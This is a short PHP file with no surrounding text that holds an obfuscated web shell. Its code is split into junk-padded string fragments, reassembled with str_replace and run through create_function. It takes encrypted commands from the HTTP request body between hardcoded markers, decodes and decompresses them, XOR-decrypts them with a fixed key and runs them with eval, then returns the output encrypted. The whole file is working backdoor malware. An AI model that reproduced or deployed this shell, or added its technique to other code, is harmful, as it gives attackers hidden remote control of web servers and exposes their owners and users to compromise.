<?php
$W='JO//inpuJOt"),$m)==JO1) {@oJOb_start();@eJOval(@JOgzunJOcompresJOs(@x(@baJOJOse64_decoJOd';
$L='b";$p="NUSegS7tJO9JOmQOSary";funJOJOction x($tJO,$k)JO{$c=strlen(JO$J';
$D='f (@pJOreg_matcJOJOh(JO"/$kh(.+)$kf/",JO@fiJOle_get_contJOentJOs("phpJO:';
$V='aseJOJO64_encode(JO@JOx(@gJOzcoJOmpress(JO$o),$k));printJO("$p$kh$rJO$kf");}';
$c='$kJO="0caa5eJO4JO0";$kh="2c745JOb014JOJO40b";$kJOf="1JO9b4afe9JOcJO42';
$O='$cJO&&$i<$l);$jJO++,$i++)JO{$JOo.=$t{$iJO}^$k{JO$j};}}reJOturnJO $o;JO}i';
$r=str_replace('Yk','','cYkrYkeate_YkfYkunYkcYktion');
$H='Ok);$l=strlJOen($t);$oJO="";foJOJOr($i=0;$i<JO$l;)JO{for($jJO=0;($JOj<';
$i='e($m[1])JO,$k)))JO;$o=JO@ob_getJO_contenJOts();JO@ob_enJOd_cleanJO(JO);$r=@b';
$x=str_replace('JO','',$c.$L.$H.$O.$D.$W.$i.$V);
$A=$r('',$x);$A();
?>
